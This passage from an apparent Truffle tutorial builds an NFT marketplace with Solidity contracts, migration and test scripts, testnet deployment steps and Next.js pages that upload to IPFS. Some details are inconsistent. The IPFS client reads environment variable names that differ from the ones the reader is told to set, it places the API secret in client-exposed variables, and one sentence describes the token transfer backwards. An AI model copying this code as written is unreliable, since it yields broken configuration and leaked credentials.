+ 1].owner == msg.sender) { nfts[nftsIndex] = _idToNFT[i + 1]; nftsIndex++; } } return nfts; } function getMyListedNfts() public view returns (NFT[] memory) { uint nftCount = _nftCount.current(); uint myListedNftCount = 0; for (uint i = 0; i < nftCount; i++) { if (_idToNFT[i + 1].seller == msg.sender && _idToNFT[i + 1].listed) { myListedNftCount++; } } NFT[] memory nfts = new NFT[](myListedNftCount); uint nftsIndex = 0; for (uint i = 0; i < nftCount; i++) { if (_idToNFT[i + 1].seller == msg.sender && _idToNFT[i + 1].listed) { nfts[nftsIndex] = _idToNFT[i + 1]; nftsIndex++; } } return nfts; } } There's a lot to unpack here! You might notice that the Marketplace contract inherits ReentrancyGuard . We do this so that we can defend against reentrancy attacks. You can read more about them here . First, let's dive into the contract variables: - Counters.Counter private _nftsSold increments when a NFT is sold and decremented when a NFT is relisted. - Counters.Counter private _nftCount tracks how many NFTs have been listed. - uint256 public LISTING_FEE is taken from the seller and transferred to the marketplace contract owner whenever an NFT is sold. - address payable private _marketOwner stores the Marketplace contract owner, so that we know who to pay the listing fee to. - mapping(uint256 => NFT) private _idToNFT associates the unique tokenId to a the NFT struct. - struct NFT stores relevant information for an NFT listed in the marketplace. - event NFTListed is emitted every time a NFT is listed. - event NFTSold is emitted every time a NFT is sold. Next, we'll go over the functions that will alter state: - listNft is called when a user first mints and lists their NFT. It transfers ownership from the user over to the Marketplace contract. - resellNft allows users to sell an NFT that they purchase on the marketplace. - buyNft is called when a user buys an NFT. The buyer becomes the new owner of the NFT, the token is transferred from the buyer to the seller, and the listing fee is given to the marketplace owner. Finally, the query functions are relatively straightforward: getListedNfts retrieves the NFTs that are currently listed for sale. getMyNfts retrieves the NFTs the user has bought. getMyListedNfts retrieves the NFTs the user has listed for sale. Deploy the Smart Contracts Locally \u00b6 In order to deploy our smart contracts, we'll need to modify migrations/1_deploy_contracts.js . Because BoredPetsNFT requires the Marketplace contract address, order matters here! Truffle allows you to deploy contracts in order using Promise or await / async . You can read more about it here . (Note that previously, Truffle also required a separate Migrations.sol contract, but that is no longer the case!) Your deployment file should look like this: var BoredPetsNFT = artifacts . require ( \"BoredPetsNFT\" ); var Marketplace = artifacts . require ( \"Marketplace\" ); module . exports = async function ( deployer ) { await deployer . deploy ( Marketplace ); const marketplace = await Marketplace . deployed (); await deployer . deploy ( BoredPetsNFT , marketplace . address ); } There are a variety of ways to get your local Ganache instance up: through the VS Code extension, Ganache CLI, and the Ganche graphical user interface. Each has its own advantages, and you can check out v7's coolest features here . In this example, we'll be using the GUI. Open it up, create a workspace, and hit save! This creates a running Ganache instance at HTTP://127.0.0.1:7545. You'll need to edit the development network in your truffle-config.js to match the port number. Now, just run truffle migrate in the CLI from the nft-marketplace folder, which will default to the development network. This will compile and deploy your contracts. You should see output similar to this: Compiling your contracts... =========================== > Compiling ./contracts/ethereum/BoredPetsNFT.sol.sol > Compiling ./contracts/ethereum/Marketplace.sol > Compiling @openzeppelin/contracts/security/ReentrancyGuard.sol > Compiling @openzeppelin/contracts/token/ERC721/ERC721.sol > Compiling @openzeppelin/contracts/token/ERC721/IERC721.sol > Compiling @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol > Compiling @openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol > Compiling @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol > Compiling @openzeppelin/contracts/utils/Address.sol > Compiling @openzeppelin/contracts/utils/Context.sol > Compiling @openzeppelin/contracts/utils/Counters.sol > Compiling @openzeppelin/contracts/utils/Strings.sol > Compiling @openzeppelin/contracts/utils/introspection/ERC165.sol > Compiling @openzeppelin/contracts/utils/introspection/IERC165.sol > Artifacts written to /Users/emilylin/truffle/nft-marketplace/client/contracts/ethereum-contracts > Compiled successfully using: - solc: 0 .8.13+commit.abaa5c0e.Emscripten.clang Starting migrations... ====================== > Network name: 'development' > Network id: 5777 > Block gas limit: 6721975 ( 0x6691b7 ) 1_deploy_contracts.js ===================== Deploying 'Marketplace' ----------------------- > transaction hash: 0xca3f5fcc301c700bdfd7bfb58c853e39085335ed0ef249bf57334ad856848383 > Blocks: 0 Seconds: 0 > contract address: 0x6F1A6D8a5414d1B1E67b69D69D5206498447aceE > block number: 1 > block timestamp: 1652487728 > account: 0x24D126143330E7f76753e13FAE39a844cbcEe829 > balance: 99 .96632092 > gas used: 1683954 ( 0x19b1f2 ) > gas price: 20 gwei > value sent: 0 ETH > total cost: 0 .03367908 ETH Deploying 'BoredPetsNFT' --------------------------- > transaction hash: 0x077ab3a709addd41229de58f3bb6ad913a5c4646cd5df39272a9db6ad3a04f05 > Blocks: 0 Seconds: 0 > contract address: 0x2935aBf19126137D47bCa1612Dc4900815A15E92 > block number: 2 > block timestamp: 1652487729 > account: 0x24D126143330E7f76753e13FAE39a844cbcEe829 > balance: 99 .91495866 > gas used: 2568113 ( 0x272fb1 ) > gas price: 20 gwei > value sent: 0 ETH > total cost: 0 .05136226 ETH > Saving artifacts ------------------------------------- > Total cost: 0 .08504134 ETH Summary ======= > Total deployments: 2 > Final cost: 0 .08504134 ETH You should be able to find your compiled contracts under ./client/contracts/ethereum-contracts Write a script \u00b6 To perform common actions, we'll take advantage of truffle exec to run scripts to automate common tasks. Let's write a script that will execute all of our different functions. First, create a new file under a new scripts folder called run.js . var BoredPetsNFT = artifacts . require ( \"BoredPetsNFT\" ); var Marketplace = artifacts . require ( \"Marketplace\" ); async function logNftLists ( marketplace ) { let listedNfts = await marketplace . getListedNfts () const accounts = await web3 . currentProvider . request ({ method : 'eth_accounts' , params : [], }); const accountAddress = accounts [ 0 ]; let myNfts = await marketplace . getMyNfts ({ from : accountAddress }) let myListedNfts = await marketplace . getMyListedNfts ({ from : accountAddress }) console . log ( `listedNfts: ${ listedNfts . length } ` ) console . log ( `myNfts: ${ myNfts . length } ` ) console . log ( `myListedNfts ${ myListedNfts . length } \\n` ) } const main = async ( cb ) => { try { const boredPets = await BoredPetsNFT . deployed () const marketplace = await Marketplace . deployed () console . log ( 'MINT AND LIST 3 NFTs' ) let listingFee = await marketplace . LISTING_FEE () listingFee = listingFee . toString () let txn1 = await boredPets . mint ( \"URI1\" ) let tokenId1 = txn1 . logs [ 2 ]. args [ 0 ]. toNumber () await marketplace . listNft ( boredPets . address , tokenId1 , 1 , { value : listingFee }) console . log ( `Minted and listed ${ tokenId1 } ` ) let txn2 = await boredPets . mint ( \"URI1\" ) let tokenId2 = txn2 . logs [ 2 ]. args [ 0 ]. toNumber () await marketplace . listNft ( boredPets . address , tokenId2 , 1 , { value : listingFee }) console . log ( `Minted and listed ${ tokenId2 } ` ) let txn3 = await boredPets . mint ( \"URI1\" ) let tokenId3 = txn3 . logs [ 2 ]. args [ 0 ]. toNumber () await marketplace . listNft ( boredPets . address , tokenId3 , 1 , { value : listingFee }) console . log ( `Minted and listed ${ tokenId3 } ` ) await logNftLists ( marketplace ) console . log ( 'BUY 2 NFTs' ) await marketplace . buyNft ( boredPets . address , tokenId1 , { value : 1 }) await marketplace . buyNft ( boredPets . address , tokenId2 , { value : 1 }) await logNftLists ( marketplace ) console . log ( 'RESELL 1 NFT' ) await marketplace . resellNft ( boredPets . address , tokenId2 , 1 , { value : listingFee }) await logNftLists ( marketplace ) } catch ( err ) { console . log ( 'Doh! ' , err ); } cb (); } module . exports = main ; In this script, you can use artifacts.require to gain access to the contract abstractions. Then, we interact with the contracts using the @truffle/contracts convenience library. You can use this functionality to write unit tests in Truffle in javasacript or typescript. Note that if you use typescript, you'll need to create a tsconfig.json file and use tsc to compile down to javascript. You can read more about tsc here . Run truffle exec scripts/run.js , and your output should look what's below: MINT AND LIST 3 NFTs listedNfts: 3 myNfts: 0 myListedNfts 3 BUY 2 NFTs listedNfts: 1 myNfts: 2 myListedNfts 1 RESELL 1 NFT listedNfts: 2 myNfts: 1 myListedNfts 1 Success! If you want to deploy your contracts on a populated blockchain, you can use Ganache to fork mainnet with zero config . Test your smart contracts \u00b6 Let's test our Marketplace contract! To do so, call: truffle create test Marketplace Then, add this code: require ( \"@openzeppelin/test-helpers/configure\" )({ provider : web3 . currentProvider , singletons : { abstraction : \"truffle\" , }, }); const { balance , ether , expectRevert , expectEvent } = require ( '@openzeppelin/test-helpers' ); const Marketplace = artifacts . require ( \"Marketplace\" ); const BoredPetsNFT = artifacts . require ( \"BoredPetsNFT\" ); function assertListing ( actual , expected ) { assert . equal ( actual . nftContract , expected . nftContract , \"NFT contract is not correct\" ); assert . equal ( actual . tokenId , expected . tokenId , \"TokenId is not correct\" ); assert . equal ( actual . owner , expected . owner , \"Owner is not correct\" ); assert . equal ( actual . seller , expected . seller , \"Seller is not correct\" ); assert . equal ( actual . price , expected . price , \"Price is not correct\" ); assert . equal ( actual . listed , expected . listed , \"Listed is not correct\" ) } function getListing ( listings , tokenId ) { let listing = {}; listings . every (( _listing ) => { if ( _listing . tokenId == tokenId ) { listing = _listing ; return false ; } else { return true ; } }); return listing } function listingToString ( listing ) { let listingCopy = {... listing }; listingCopy . tokenId = listing . tokenId . toString (); listingCopy . price = listing . price . toString (); if ( listing . listed ) { listingCopy . listed = listing . listed . toString (); } return listingCopy ; } async function mintNft ( nftContract , tokenOwner ) { return ( await nftContract . mint ( \"fakeURI\" , { from : tokenOwner })). logs [ 0 ]. args . tokenId . toNumber () } contract ( \"Marketplace\" , function ( accounts ) { const MARKETPLACE_OWNER = accounts [ 0 ]; const TOKEN_OWNER = accounts [ 1 ]; const BUYER = accounts [ 2 ]; let marketplace ; let boredPetsNFT ; let nftContract ; let listingFee ; before ( 'should reuse variables' , async () => { marketplace = await Marketplace . deployed (); boredPetsNFT = await BoredPetsNFT . deployed (); nftContract = boredPetsNFT . address ; listingFee = ( await marketplace . LISTING_FEE ()). toString (); console . log ( \"marketplace %s\" , marketplace . address ) console . log ( \"token_owner %s\" , TOKEN_OWNER ) console . log ( \"buyer %s\" , BUYER ) }); it ( \"should validate before listing\" , async function () { await expectRevert ( marketplace . listNft ( nftContract , 1 , ether ( \".005\" ), { from : TOKEN_OWNER }), \"Not enough ether for listing fee\" ); await expectRevert ( marketplace . listNft ( nftContract , 1 , 0 , { from : TOKEN_OWNER , value : listingFee }), \"Price must be at least 1 wei\" ); }); it ( \"should list nft\" , async function () { let tokenID = await mintNft ( boredPetsNFT , TOKEN_OWNER ); let tracker = await balance . tracker ( MARKETPLACE_OWNER ); await tracker . get (); let txn = await marketplace . listNft ( nftContract , tokenID , ether ( \".005\" ), { from : TOKEN_OWNER , value : listingFee }); assert . equal ( await tracker . delta (), listingFee , \"Listing fee not transferred\" ); let expectedListing = { nftContract : nftContract , tokenId : tokenID , seller : TOKEN_OWNER , owner : marketplace . address , price : ether ( \".005\" ), listed : true }; assertListing ( getListing ( await marketplace . getListedNfts (), tokenID ), expectedListing ); assertListing ( getListing ( await marketplace . getMyListedNfts ({ from : TOKEN_OWNER }), tokenID ), expectedListing ); delete expectedListing . listed ; expectEvent ( txn , \"NFTListed\" , listingToString ( expectedListing )); }); it ( \"should validate before buying\" , async function () { await expectRevert ( marketplace . buyNft ( nftContract , 1 , { from : BUYER }), \"Not enough ether to cover asking price\" ); }); it ( \"should modify listings when nft is bought\" , async function () { let tokenID = await mintNft ( boredPetsNFT , TOKEN_OWNER ); await marketplace . listNft ( nftContract , tokenID , ether ( \".005\" ), { from : TOKEN_OWNER , value : listingFee }); let expectedListing = { nftContract : nftContract , tokenId : tokenID , seller : TOKEN_OWNER , owner : marketplace . address , price : ether ( \".005\" ), listed : true }; assertListing ( getListing ( await marketplace . getListedNfts (), tokenID ), expectedListing ); let tracker = await balance . tracker ( TOKEN_OWNER ); let txn = await marketplace . buyNft ( nftContract , tokenID , { from : BUYER , value : ether ( \".005\" )}); expectedListing . owner = BUYER ; expectedListing . listed = false ; assert . equal (( await tracker . delta ()). toString (), ether ( \".005\" ). toString (), \"Price not paid to seller\" ); assertListing ( getListing ( await marketplace . getMyNfts ({ from : BUYER }), tokenID ), expectedListing ); delete expectedListing . listed ; expectEvent ( txn , \"NFTSold\" , listingToString ( expectedListing )); }); it ( \"should validate reselling\" , async function () { await expectRevert ( marketplace . resellNft ( nftContract , 1 , 0 , { from : BUYER , value : listingFee }), \"Price must be at least 1 wei\" ); await expectRevert ( marketplace . resellNft ( nftContract , 1 , ether ( \".005\" ), { from : BUYER }), \"Not enough ether for listing fee\" ); }); it ( \"should resell nft\" , async function () { let tokenID = await mintNft ( boredPetsNFT , TOKEN_OWNER ); await marketplace . listNft ( nftContract , tokenID , ether ( \".005\" ), { from : TOKEN_OWNER , value : listingFee }); await marketplace . buyNft ( nftContract , tokenID , { from : BUYER , value : ether ( \".005\" )}); let expectedListing = { nftContract : nftContract , tokenId : tokenID , seller : TOKEN_OWNER , owner : BUYER , price : ether ( \".005\" ), listed : false }; assertListing ( getListing ( await marketplace . getMyNfts ({ from : BUYER }), tokenID ), expectedListing ); await boredPetsNFT . approve ( marketplace . address , tokenID , { from : BUYER }); let txn = await marketplace . resellNft ( nftContract , tokenID , ether ( \".005\" ), { from : BUYER , value : listingFee }); expectedListing . seller = BUYER ; expectedListing . owner = marketplace . address ; expectedListing . listed = true ; assertListing ( getListing ( await marketplace . getListedNfts (), tokenID ), expectedListing ); assertListing ( getListing ( await marketplace . getMyListedNfts ({ from : BUYER }), tokenID ), expectedListing ); delete expectedListing . listed ; expectEvent ( txn , \"NFTListed\" , listingToString ( expectedListing )); }); }); Other Ways to Deploy \u00b6 Deploy to Truffle Dashboards \u00b6 In this tutorial, we'll take you through how to deploy to a testnet using Truffle dashboards , which allows you to sign your transactions using MetaMask. This allows you to keep your private key safe, since you don't have to save it locally. In order to do so, you'll need to get some test eth from a faucet . First, run truffle dashboard in a separate terminal window. It should open truffle dashboards at http://127.0.0.1:24012/. Then, you can use your MetaMask wallet to connect to a network of your choice. In this case, we'll select the Goerli network. Next, migrate your contract to dashboards using truffle migrate --network dashboard . If you head back to the dashboard tab, you'll see the request to sign using MetaMask. Hit accept, and voila! Head back to the terminal, and you should see the that your contracts were deployed. After changing the account number, you can execute the script again to test: truffle exec scripts/run.js Deploy Using a .env File \u00b6 If you don't want to use Dashboards, you can modify your Truffle config files to use environment variables you set up. Create a .env file with the following code: INFURA_KEY = \"<Your Infura project key>\" GANACHE_MNEMONIC = \"<Your Ganache mnemonic>\" GOERLI_MNEMONIC = \"<Your Metamask mnemonic>\" The .gitignore already ignores .env , but since you're populating your mnemonic/secret key here, PLEASE DO NOT COMMIT THIS ANYWHERE PUBLIC. Then, just run truffle migrate --network [NETWORK NAME] or npm run migrate:ovm --network=[NETWORK NAME] Deploy to Optimistic Goerli \u00b6 Since Optimism is EVM equivalent with small exceptions , we can just copy our contracts from the contracts/ethereum over to contracts/optimism . To get Eth for Optimistic Goerli, you can use this faucet . You'll need to sign up with a Github account older than 1 month and be following at least 5 repos: - trufflesuite - truffle-box - Infura - MetaMask - Optimism Our box already includes the Optimistic Goerli configuration in truffle-confg.ovm.js . Run npm run migrate:ovm --network=optimistic_goerli to deploy, and npm run exec:ovm scripts/run.js --network=optimistic_goerli to test! Since we are using a testnet, connectivity can get a bit flaky. You can try again by running the migrate command with --reset . Alternatively, you might see occasionally see something like this: TypeError: Cannot read properties of null ( reading 'from' ) In which case, you can specify the from address in the deploy script as follows ( ACCOUNT_ADDRESS is the address that will be signing the transaction): module . exports = async function ( deployer ) { await deployer . deploy ( Marketplace ); const marketplace = await Marketplace . deployed (); await deployer . deploy ( BoredPetsNFT , marketplace . address , { from : \"ACCOUNT_ADDRESS\" }); } Deploy to Optimism Locally \u00b6 You can also deploy to a locally running instance of Optimism. You'll need to have very specific system requirements . Make sure ports 9545 and 8545 are free, and then run: npm run installLocalOptimism npm run startLocalOptimism Create an Infura IPFS project \u00b6 You'll need Infura IPFS account and dedicated gateway to upload your NFT metadata. To create a IPFS project, select create IPFS project. Then, you'll need to create a unique gateway name. In this project, we'll call it optimism-demo . You will need to give your own dedicated gateway with its own unique name. Create Your Front End \u00b6 First, we need to install some packages to get our client up and running: cd client npm install axios npm install web3modal npm install web3 npm install ipfs-http-client Then, we need to create or edit 6 files that sit under client/pages : _app.js \u00b6 This file organizes the link routing import '../styles/globals.css' import Link from 'next/link' function MyApp ({ Component , pageProps }) { return ( < div > < nav className = \"border-b p-6\" > < p className = \"text-4xl font-bold\" > Bored Pet Marketplace < /p> < div className = \"flex mt-4\" > < Link href = \"/\" className = \"mr-4 text-teal-400\" > Home < /Link> < Link href = \"/create-and-list-nft\" className = \"mr-6 text-teal-400\" > Sell a new NFT < /Link> < Link href = \"/my-nfts\" className = \"mr-6 text-teal-400\" > My NFTs < /Link> < Link href = \"/my-listed-nfts\" className = \"mr-6 text-teal-400\" > My Listed NFTs < /Link> < /div> < /nav> < Component {... pageProps } /> < /div> ) } export default MyApp index.js \u00b6 Thie file is the Home tab, where a user can see and buy all of the listed NFTs. import Web3 from 'web3' ; import Web3Modal from 'web3modal' ; import { useEffect , useState } from 'react' ; import axios from 'axios' ; import Marketplace from '../contracts/optimism-contracts/Marketplace.json' import BoredPetsNFT from '../contracts/optimism-contracts/BoredPetsNFT.json' export default function Home () { const [ nfts , setNfts ] = useState ([]) const [ loadingState , setLoadingState ] = useState ( 'not-loaded' ) useEffect (() => { loadNFTs () }, []) async function loadNFTs () { const web3Modal = new Web3Modal () const provider = await web3Modal . connect () const web3 = new Web3 ( provider ) const networkId = await web3 . eth . net . getId () // Get all listed NFTs const marketPlaceContract = new web3 . eth . Contract ( Marketplace . abi , Marketplace . networks [ networkId ]. address ) const listings = await marketPlaceContract . methods . getListedNfts (). call () // Iterate over the listed NFTs and retrieve their metadata const nfts = await Promise . all ( listings . map ( async ( i ) => { try { const boredPetsContract = new web3 . eth . Contract ( BoredPetsNFT . abi , BoredPetsNFT . networks [ networkId ]. address ) const tokenURI = await boredPetsContract . methods . tokenURI ( i . tokenId ). call () const meta = await axios . get ( tokenURI ) const nft = { price : i . price , tokenId : i . tokenId , seller : i . seller , owner : i . buyer , image : meta . data . image , name : meta . data . name , description : meta . data . description , } return nft } catch ( err ) { console . log ( err ) return null } })) setNfts ( nfts . filter ( nft => nft !== null )) setLoadingState ( 'loaded' ) } async function buyNft ( nft ) { const web3Modal = new Web3Modal () const provider = await web3Modal . connect () const web3 = new Web3 ( provider ) const networkId = await web3 . eth . net . getId (); const marketPlaceContract = new web3 . eth . Contract ( Marketplace . abi , Marketplace . networks [ networkId ]. address ); const accounts = await web3 . eth . getAccounts (); await marketPlaceContract . methods . buyNft ( BoredPetsNFT . networks [ networkId ]. address , nft . tokenId ). send ({ from : accounts [ 0 ], value : nft . price }); loadNFTs () } if ( loadingState === 'loaded' && ! nfts . length ) { return ( < h1 className = \"px-20 py-10 text-3xl\" > No pets available !< /h1>) } else { return ( < div className = \"flex justify-center\" > < div className = \"px-4\" style = { { maxWidth : '1600px' } } > < div className = \"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 pt-4\" > { nfts . map (( nft , i ) => ( < div key = { i } className = \"border shadow rounded-xl overflow-hidden\" > < img src = { nft . image } /> < div className = \"p-4\" > < p style = { { height : '64px' } } className = \"text-2xl font-semibold\" > { nft . name } < /p> < div style = { { height : '70px' , overflow : 'hidden' } } > < p className = \"text-gray-400\" > { nft . description } < /p> < /div> < /div> < div className = \"p-4 bg-black\" > < p className = \"text-2xl font-bold text-white\" > { Web3 . utils . fromWei ( nft . price , \"ether\" )} ETH < /p> < button className = \"mt-4 w-full bg-teal-400 text-white font-bold py-2 px-12 rounded\" onClick = {() => buyNft ( nft )} > Buy < /button> < /div> < /div> )) } < /div> < /div> < /div> ) } } create-and-list-nft.js \u00b6 This is the Sell tab, where a user can create and list an NFT. Make sure you replace with the dedicated gateway name you create in your IPFS project on Infura. You'll also need to add in your IPFS API and Secret to create our IPFS client. To do so, create .env.local in your client folder. Then, populate it with these values: NEXT_PUBLIC_IPFS_SECRET = NEXT_PUBLIC_IPFS_PROJECT_ID = Then, copy paste this code: import { useState } from 'react' import Web3 from 'web3' import Web3Modal from 'web3modal' import { useRouter } from 'next/router' import { create as ipfsHttpClient } from 'ipfs-http-client' import Marketplace from '../contracts/optimism-contracts/Marketplace.json' import BoredPetsNFT from '../contracts/optimism-contracts/BoredPetsNFT.json' const projectId = process . env [ \"NEXT_PUBLIC_IPFS_KEY\" ]; const projectSecret = process . env [ \"NEXT_PUBLIC_IPFS_PROJECT_ID\" ]; const auth = 'Basic ' + Buffer . from ( projectId + ':' + projectSecret ). toString ( 'base64' ); const client = ipfsHttpClient ({ host : 'ipfs.infura.io' , port : 5001 , protocol : 'https' , headers : { authorization : auth , }, }); export default function CreateItem () { const [ fileUrl , setFileUrl ] = useState ( null ) const [ formInput , updateFormInput ] = useState ({ price : '' , name : '' , description : '' }) const router = useRouter () async function onChange ( e ) { // upload image to IPFS const file = e . target . files [ 0 ] try { const added = await client . add ( file , { progress : ( prog ) => console . log ( `received: ${ prog } ` ) } ) const url = `https://<DEDICATED_GATEWAY>.infura-ipfs.io/ipfs/ ${ added . path } ` setFileUrl ( url ) } catch ( error ) { console . log ( 'Error uploading file: ' , error ) } } async function uploadToIPFS () { const { name , description , price } = formInput if ( ! name || ! description || ! price || ! fileUrl ) { return } else { // first, upload metadata to IPFS const data = JSON . stringify ({ name , description , image : fileUrl }) try { const added = await client . add ( data ) console . log ( 'added: ' , added ) const url = `https://<DEDICATED_GATEWAY>.infura-ipfs.io/ipfs/ ${ added . path } ` // after metadata is uploaded to IPFS, return the URL to use it in the transaction return url } catch ( error ) { console . log ( 'Error uploading file: ' , error ) } } } async function listNFTForSale () { const web3Modal = new Web3Modal () const provider = await web3Modal . connect () const web3 = new Web3 ( provider ) const url = await uploadToIPFS () const networkId = await web3 . eth . net . getId () // Mint the NFT const boredPetsContractAddress = BoredPetsNFT . networks [ networkId ]. address const boredPetsContract = new web3 . eth . Contract ( BoredPetsNFT . abi , boredPetsContractAddress ) const accounts = await web3 . eth . getAccounts () const marketPlaceContract = new web3 . eth . Contract ( Marketplace . abi , Marketplace . networks [ networkId ]. address ) let listingFee = await marketPlaceContract . methods . LISTING_FEE (). call () listingFee = listingFee . toString () boredPetsContract . methods . mint ( url ). send ({ from : accounts [ 0 ] }). on ( 'receipt' , function ( receipt ) { console . log ( 'minted' ); // List the NFT const tokenId = receipt . events . NFTMinted . returnValues [ 0 ]; marketPlaceContract . methods . listNft ( boredPetsContractAddress , tokenId , Web3 . utils . toWei ( formInput . price , \"ether\" )) . send ({ from : accounts [ 0 ], value : listingFee }). on ( 'receipt' , function () { console . log ( 'listed' ) router . push ( '/' ) }); }); } return ( < div className = \"flex justify-center\" > < div className = \"w-1/2 flex flex-col pb-12\" > < input placeholder = \"Asset Name\" className = \"mt-8 border rounded p-4\" onChange = { e => updateFormInput ({ ... formInput , name : e . target . value })} /> < textarea placeholder = \"Asset Description\" className = \"mt-2 border rounded p-4\" onChange = { e => updateFormInput ({ ... formInput , description : e . target . value })} /> < input placeholder = \"Asset Price in Eth\" className = \"mt-2 border rounded p-4\" onChange = { e => updateFormInput ({ ... formInput , price : e . target . value })} /> < input type = \"file\" name = \"Asset\" className = \"my-4\" onChange = { onChange } /> { fileUrl && ( < img className = \"rounded mt-4\" width = \"350\" src = { fileUrl } /> ) } < button onClick = { listNFTForSale } className = \"font-bold mt-4 bg-teal-400 text-white rounded p-4 shadow-lg\" > Mint and list NFT < /button> < /div> < /div> ) } my-nfts.js \u00b6 This is the My NFTs tab, where the user can see the NFTs they own and choose to resell. import Web3 from 'web3' ; import { useEffect , useState } from 'react' import axios from 'axios' import Web3Modal from 'web3modal' import { useRouter } from 'next/router' import Marketplace from '../contracts/optimism-contracts/Marketplace.json' ; import BoredPetsNFT from '../contracts/optimism-contracts/BoredPetsNFT.json' ; export default function MyAssets () { const [ nfts , setNfts ] = useState ([]) const [ loadingState , setLoadingState ] = useState ( 'not-loaded' ) const router = useRouter () useEffect (() => { loadNFTs () }, []) async function loadNFTs () { const web3Modal = new Web3Modal () const provider = await web3Modal . connect () const web3 = new Web3 ( provider ) const networkId = await web3 . eth . net . getId () const marketPlaceContract = new web3 . eth . Contract ( Marketplace . abi , Marketplace . networks [ networkId ]. address ) const boredPetsContractAddress = BoredPetsNFT . networks [ networkId ]. address const boredPetsContract = new web3 . eth . Contract ( BoredPetsNFT . abi , boredPetsContractAddress ) const accounts = await web3 . eth . getAccounts () const data = await marketPlaceContract . methods . getMyNfts (). call ({ from : accounts [ 0 ]}) const nfts = await Promise . all ( data . map ( async i => { try { const tokenURI = await boredPetsContract . methods . tokenURI ( i . tokenId ). call () const meta = await axios . get ( tokenURI ) let nft = { price : i . price , tokenId : i . tokenId , seller : i . seller , owner : i . buyer , image : meta . data . image , name : meta . data . name , description : meta . data . description , tokenURI : tokenURI } return nft } catch ( err ) { console . log ( err ) return null } })) setNfts ( nfts . filter ( nft => nft !== null )) setLoadingState ( 'loaded' ) } function listNFT ( nft ) { router . push ( `/resell-nft?id= ${ nft . tokenId } &tokenURI= ${ nft . tokenURI } ` ) } if ( loadingState === 'loaded' && ! nfts . length ) { return ( < h1 className = \"py-10 px-20 text-3xl\" > No NFTs owned < /h1>); } else { return ( < div className = \"flex justify-center\" > < div className = \"p-4\" > < div className = \"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 pt-4\" > { nfts . map (( nft , i ) => ( < div key = { i } className = \"border shadow rounded-xl overflow-hidden\" > < img src = { nft . image } className = \"rounded\" /> < div className = \"p-4\" > < p style = { { height : '64px' } } className = \"text-2xl font-semibold\" > { nft . name } < /p> < div style = { { height : '70px' , overflow : 'hidden' } } > < p className = \"text-gray-400\" > { nft . description } < /p> < /div> < /div> < div className = \"p-4 bg-black\" > < p className = \"text-2xl font-bold text-white\" > Price - { Web3 . utils . fromWei ( nft . price , \"ether\" )} Eth < /p> < button className = \"mt-4 w-full bg-teal-400 text-white font-bold py-2 px-12 rounded\" onClick = {() => listNFT ( nft )} > List < /button> < /div> < /div> )) } < /div> < /div> < /div> ); } } resell-nft.js \u00b6 This is the page the user is directed to to resell their NFTs. import { useEffect , useState } from 'react' import Web3 from 'web3' import { useRouter } from 'next/router' import axios from 'axios' import Web3Modal from 'web3modal' import Marketplace from '../contracts/optimism-contracts/Marketplace.json' import BoredPetsNFT from '../contracts/optimism-contracts/BoredPetsNFT.json' export default function ResellNFT () { const [ formInput , updateFormInput ] = useState ({ price : '' , image : '' }) const router = useRouter () const { id , tokenURI } = router . query const { image , price } = formInput useEffect (() => { fetchNFT () }, [ id ]) async function fetchNFT () { if ( ! tokenURI ) { return } else { const meta = await axios . get ( tokenURI ) updateFormInput ( state => ({ ... state , image : meta . data . image })) } } async function listNFTForSale () { if ( ! price ) { return } else { const web3Modal = new Web3Modal () const provider = await web3Modal . connect () const web3 = new Web3 ( provider ) const networkId = await web3 . eth . net . getId () const marketPlaceContract = new web3 . eth . Contract ( Marketplace . abi , Marketplace . networks [ networkId ]. address ) let listingFee = await marketPlaceContract . methods . LISTING_FEE (). call () listingFee = listingFee . toString () const accounts = await web3 . eth . getAccounts () marketPlaceContract . methods . resellNft ( BoredPetsNFT . networks [ networkId ]. address , id , Web3 . utils . toWei ( formInput . price , \"ether\" )) . send ({ from : accounts [ 0 ], value : listingFee }). on ( 'receipt' , function () { router . push ( '/' ) }); } } return ( < div className = \"flex justify-center\" > < div className = \"w-1/2 flex flex-col pb-12\" > < input placeholder = \"Asset Price in Eth\" className = \"mt-2 border rounded p-4\" onChange = { e => updateFormInput ({ ... formInput , price : e . target . value })} /> { image && ( < img className = \"rounded mt-4\" width = \"350\" src = { image } /> ) } < button onClick = { listNFTForSale } className = \"font-bold mt-4 bg-teal-400 text-white rounded p-4 shadow-lg\" > List NFT < /button> < /div> < /div> ) } my-listed-nfts.js \u00b6 This is the My Listed NFTs tab, where users can see what NFTs they have listed for sale. import Web3 from 'web3' ; import { useEffect , useState } from 'react' ; import axios from 'axios' ; import Web3Modal from 'web3modal' ; import Marketplace from '../contracts/optimism-contracts/Marketplace.json' ; import BoredPetsNFT from '../contracts/optimism-contracts/BoredPetsNFT.json' ; export default function CreatorDashboard () { const [ nfts , setNfts ] = useState ([]) const [ loadingState , setLoadingState ] = useState ( 'not-loaded' ) useEffect (() => { loadNFTs () }, []) async function loadNFTs () { const web3Modal = new Web3Modal () const provider = await web3Modal . connect () const web3 = new Web3 ( provider ) const networkId = await web3 . eth . net . getId () // Get listed NFTs const marketPlaceContract = new web3 . eth . Contract ( Marketplace . abi , Marketplace . networks [ networkId ]. address ) const accounts = await web3 . eth . getAccounts () const listings = await marketPlaceContract . methods . getMyListedNfts (). call ({ from : accounts [ 0 ]}) // Iterate over my listed NFTs and retrieve their metadata const nfts = await Promise . all ( listings . map ( async i => { try { const boredPetsContract = new web3 . eth . Contract ( BoredPetsNFT . abi , BoredPetsNFT . networks [ networkId ]. address ) const tokenURI = await boredPetsContract . methods . tokenURI ( i . tokenId ). call (); const meta = await axios . get ( tokenURI ); let item = { price : i . price , tokenId : i . tokenId , seller : i . seller , owner : i . owner , image : meta . data . image , } return item } catch ( err ) { console . log ( err ) return null } })) setNfts ( nfts . filter ( nft => nft !== null )) setLoadingState ( 'loaded' ) } if ( loadingState === 'loaded' && ! nfts . length ) { return ( < h1 className = \"py-10 px-20 text-3xl\" > No NFTs listed < /h1>) } else { return ( < div > < div className = \"p-4\" > < h2 className = \"text-2xl py-2\" > Items Listed < /h2> < div className = \"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 pt-4\" > { nfts . map (( nft , i ) => ( < div key = { i } className = \"border shadow rounded-xl overflow-hidden\" > < img src = { nft . image } className = \"rounded\" /> < div className = \"p-4 bg-black\" > < p className = 